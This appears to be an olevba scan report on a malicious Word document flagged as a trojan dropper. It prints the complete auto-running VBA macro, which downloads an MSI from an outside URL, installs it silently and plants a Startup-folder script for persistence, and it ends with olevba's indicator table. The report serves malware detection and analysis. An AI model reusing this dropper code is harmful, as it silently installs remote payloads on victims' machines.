olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan-Dropper.MSOffice.SDrop.gen-a9a7e2936d94dede1a6afb99ca32d775d6121d7580045f5ebb9beff211f0c271
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan-Dropper.MSOffice.SDrop.gen-a9a7e2936d94dede1a6afb99ca32d775d6121d7580045f5ebb9beff211f0c271 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
outputFiledell = CreateObject("WScript.Shell").SpecialFolders("MyDocuments") & "\Pixlr.vbs"

Set objFSO = CreateObject("Scripting.FileSystemObject")
  WriteString = "strLink = ""https://vinnysvinyl.com/Pixlr.msi"" " & vbCrLf
  WriteString = WriteString & "Set oShell = CreateObject(""WScript.Shell"") " & vbCrLf
  WriteString = WriteString & "strHomeFolder = oShell.ExpandEnvironmentStrings(""%USERPROFILE%"") & ""\"" " & vbCrLf
  WriteString = WriteString & "strSaveName = Mid(strLink, InStrRev(strLink,""/"") + 1, Len(strLink)) " & vbCrLf
  WriteString = WriteString & "strSaveTo = strHomeFolder  & strSaveName " & vbCrLf
  WriteString = WriteString & "Set objHTTP = CreateObject( ""WinHttp.WinHttpRequest.5.1"" ) " & vbCrLf
  WriteString = WriteString & "objHTTP.Open ""GET"", strLink, False " & vbCrLf
  WriteString = WriteString & "objHTTP.Send " & vbCrLf
  WriteString = WriteString & "Set objFSO = CreateObject(""Scripting.FileSystemObject"") " & vbCrLf
  WriteString = WriteString & "If objFSO.FileExists(strSaveTo) Then " & vbCrLf
  WriteString = WriteString & " objFSO.DeleteFile(strSaveTo) " & vbCrLf
  WriteString = WriteString & "End If " & vbCrLf
  WriteString = WriteString & "If objHTTP.Status = 200 Then " & vbCrLf
  WriteString = WriteString & "Dim objStream " & vbCrLf
  WriteString = WriteString & "Set objStream = CreateObject(""ADODB.Stream"") " & vbCrLf
  WriteString = WriteString & "With objStream " & vbCrLf
  WriteString = WriteString & "   .Type = 1  " & vbCrLf
  WriteString = WriteString & ".Open " & vbCrLf
  WriteString = WriteString & ".Write objHTTP.ResponseBody " & vbCrLf
  WriteString = WriteString & ".SaveToFile strSaveTo " & vbCrLf
  WriteString = WriteString & " .Close " & vbCrLf
  WriteString = WriteString & " End With " & vbCrLf
  WriteString = WriteString & " set objStream = Nothing " & vbCrLf
  WriteString = WriteString & "  End If " & vbCrLf
  WriteString = WriteString & "Set objShell = CreateObject(""WScript.Shell"") " & vbCrLf
  WriteString = WriteString & "comspec = objShell.ExpandEnvironmentStrings(""msiexec.EXE"") " & vbCrLf
  WriteString = WriteString & "Set objExec = objShell.Exec(comspec & "" /i "" & strSaveTo & "" /quiet /qn /norestart"") "
Set objFile = objFSO.CreateTextFile(outputFiledell, True)
objFile.Write WriteString & vbCrLf
objFile.Close

Set objShell = CreateObject("WScript.Shell")
comspec = objShell.ExpandEnvironmentStrings("cmd.EXE")
Set objExec = objShell.Exec(comspec & " /c Start " & outputFiledell & " && taskkill /F /IM cmd.exe")


outputFilSt = CreateObject("WScript.Shell").SpecialFolders("Startup") & "\Pixlr.vbs"
WriteString = "Set oShell = CreateObject(""WScript.Shell"") " & vbCrLf
 WriteString = WriteString & "strHomeFolder = oShell.ExpandEnvironmentStrings(""%USERPROFILE%"") & ""\""" & vbCrLf
 WriteString = WriteString & " strSaveTo = strHomeFolder  & ""\Pixlr.msi"" " & vbCrLf
WriteString = WriteString & "Set objShell = CreateObject(""WScript.Shell"") " & vbCrLf
  WriteString = WriteString & "comspec = objShell.ExpandEnvironmentStrings(""msiexec.EXE"") " & vbCrLf
  WriteString = WriteString & "Set objExec = objShell.Exec(comspec & "" /i "" & strSaveTo & "" /quiet /qn /norestart"") "
  
  Set objFile = objFSO.CreateTextFile(outputFilSt, True)
objFile.Write WriteString & vbCrLf
objFile.Close
End Sub






+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|ExpandEnvironmentStr|May read system environment variables        |
|          |ings                |                                             |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|ADODB.Stream        |May create a text file                       |
|Suspicious|SaveToFile          |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Exec                |May run an executable file or a system       |
|          |                    |command using Excel 4 Macros (XLM/XLF)       |
|IOC       |https://vinnysvinyl.|URL                                          |
|          |com/Pixlr.msi       |                                             |
|IOC       |Pixlr.vbs           |Executable file name                         |
|IOC       |Pixlr.msi           |Executable file name                         |
|IOC       |msiexec.EXE         |Executable file name                         |
|IOC       |cmd.EXE             |Executable file name                         |
|IOC       |cmd.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

